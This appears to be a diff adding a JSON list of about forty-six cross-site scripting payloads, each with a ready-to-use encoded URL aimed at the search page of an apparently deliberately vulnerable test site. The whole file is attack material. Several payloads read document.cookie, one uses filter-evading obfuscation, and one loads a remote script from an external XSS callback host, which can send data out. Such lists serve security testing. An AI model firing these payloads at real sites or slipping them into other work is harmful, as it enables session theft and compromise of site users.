@@ -1,0 +1,186 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%22%2F%3E%3Cimg+src%3D+x+onerror%3D%27alert%28document.domain%29%27%3E",
+        "payload": "'\"/><img src= x onerror='alert(document.domain)'>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%22%2F%3E%3Cimg+src%3D+x+onerror%3Dprompt%28%2Fxss%2F%29%3E",
+        "payload": "'\"/><img src= x onerror=prompt(/xss/)>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fbluediving2024%3E%3C%2Fscript%3E",
+        "payload": "'\"><script src=https://xss.report/c/bluediving2024></script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%22%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E",
+        "payload": "'\"><script>alert(2);</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%22%60%3E%3Cscript%3E%2F%2A+%2A%5Cx2Fjavascript%3Aalert%281%29%2F%2F+%2A%2F%3C%2Fscript%3E",
+        "payload": "'\"`><script>/* *\\x2Fjavascript:alert(1)// */</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%29%3Balert%281%29%2F%2F",
+        "payload": "');alert(1)//"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%29%7D%2C+1000%29%3B+alert%28%27xss%27%29%3A%2F%2F",
+        "payload": "')}, 1000); alert('xss')://"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%29%3Bconfirm%281%29%3B%2F%2F",
+        "payload": "');confirm(1);//"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%29%3Balert%28document.cookie%29%28%29%3B%2F%2F",
+        "payload": "');alert(document.cookie)();//"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%29%7D%2C+1000%29%3Balert%28%22xss%22%29%3B%2F%2F",
+        "payload": "')}, 1000);alert(\"xss\");//"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%271%2F-alert%5C5023%5C51%2F%27%3B",
+        "payload": "'1/-alert\\5023\\51/';"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%28%29+%7B%27document.createElement%28%27img%27%29.src%3D%27javascript%3Awhile%281%29%7B%7D%27",
+        "payload": "'() {'document.createElement('img').src='javascript:while(1){}'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%2Cdocument.location%3D%27javascript%3Adocument.domain%27%2C%27",
+        "payload": "',document.location='javascript:document.domain','"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E",
+        "payload": "'><script>alert(document.cookie);</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%60%22%2F%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "payload": "'`\"//><script>alert(1)</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28document.cookie%29%3E",
+        "payload": "'></script><svg/onload=alert(document.cookie)>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cscr%27%2B%27ipt%3Ealert%28document.cookie%29%3C%2Fscr%27%2B%27ipt%3E%3Cb%3E%3C%21--",
+        "payload": "'><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript+x%3D%27",
+        "payload": "'><script>alert(123);</script x='"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%5Cu0029%5Cu0028%7D%3Balert%28document.cookie%29%3B%2F%2F%22",
+        "payload": "'\\u0029\\u0028};alert(document.cookie);//\""
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cimg%2BsRc%3Dl%2BoNerrOr%3Dprompt%28document.cookie%29%2Bx%3E",
+        "payload": "'><img+sRc=l+oNerrOr=prompt(document.cookie)+x>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
+        "payload": "'><script>alert(document.cookie)</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%60%22%3E%3C%2Achr%2Ascript%3Elog%28%2Anum%2A%29%3C%2Fscript%3E",
+        "payload": "'`\"><*chr*script>log(*num*)</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27JaVaScRiPt%3Aprompt%27%2Bdocument.location.hash%5B1%5D%2B%2745%27%2Bdocument.location.hash%5B2%5D",
+        "payload": "'JaVaScRiPt:prompt'+document.location.hash[1]+'45'+document.location.hash[2]"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E",
+        "payload": "'><script>alert(123)</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%3Fprompt%601%60%3F%27",
+        "payload": "'?prompt`1`?'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27alert%5Cx2823%5Cx29%27instanceof%7B%5BSymbol.hasInstance%5D%3Aeval%7D",
+        "payload": "'alert\\x2823\\x29'instanceof{[Symbol.hasInstance]:eval}"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27confirm%28document.domain%29%27%3E",
+        "payload": "'confirm(document.domain)'>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27href%3Djavascript%3Aalert%28%29%3Eclick+me%3Ca%2Fy%3D%27",
+        "payload": "'href=javascript:alert()>click me<a/y='"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27alert%281%29%27.replace%28%2F.%2B%2F%2Ceval%29",
+        "payload": "'alert(1)'.replace(/.+/,eval)"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%60%22%3E%3C%5Cx3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E",
+        "payload": "'`\"><\\x3Cscript>javascript:alert(1)</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27a%27.constructor.prototype.charAt%3D%5B%5D.join%3B%5B1%5D%7CorderBy%3A%27x%3D1%7D+%7D+%7D%3Balert%281%29%2F%2F%27%3B",
+        "payload": "'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27javaScriPt%3Aalert%5Cx2845%5Cx29%27",
+        "payload": "'javaScriPt:alert\\x2845\\x29'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27onfocus%3D%27alert%281%29%27+autofocus%3D%27",
+        "payload": "'onfocus='alert(1)' autofocus='"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27x%27%2520onclick%3D%27confirm%601%60%27",
+        "payload": "'x'%20onclick='confirm`1`'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27onload%3Dalert%281%29%3E%3Csvg%2F1%3D%27",
+        "payload": "'onload=alert(1)><svg/1='"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%7D%29%3Balert%28document.cookie%29%3B%2F%2F%27",
+        "payload": "'});alert(document.cookie);//'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27te%27+%2F+alert%28%27%2F%27%29+%2F+%27xt%27%3B",
+        "payload": "'te' / alert('/') / 'xt';"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27x%27%252520onclick%3D%27confirm%25601%2560%27",
+        "payload": "'x'%2520onclick='confirm%601%60'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=-%28a%3Dalert%2Cb%3D%22_Y000%21_%22%2C%5Bb%5D.find%28a%29%29-%27",
+        "payload": "-(a=alert,b=\"_Y000!_\",[b].find(a))-'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=-setTimeout%60prompt%5Cu0028document.domain%5Cu0029%60-%27",
+        "payload": "-setTimeout`prompt\\u0028document.domain\\u0029`-'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=-alert%281%29-%27",
+        "payload": "-alert(1)-'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%5Cu003e%5C%27%3C%2Fb%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cb%3E%3C%21--%27",
+        "payload": "'\\u003e\\'</b><script>alert(document.cookie)</script><b><!--'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%27%5Cu003E%27%5Cu0022%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E",
+        "payload": "'\\u003E'\\u0022><script>alert(2);</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=1%22%3E%3C%253Csvg+onload%3Dalert%2528document.cookie%2529%3E%27",
+        "payload": "1\"><%3Csvg onload=alert%28document.cookie%29>'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%3CIFRAME+SRC%3D%22javascript%3Aalert%28document.cookie%29%3B%22%3E%3C%2Fiframe%3E%27",
+        "payload": "<IFRAME SRC=\"javascript:alert(document.cookie);\"></iframe>'"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=%3Cx+onxxx%3Dalert%281%29+1%3D%27",
+        "payload": "<x onxxx=alert(1) 1='"
+    }
+]
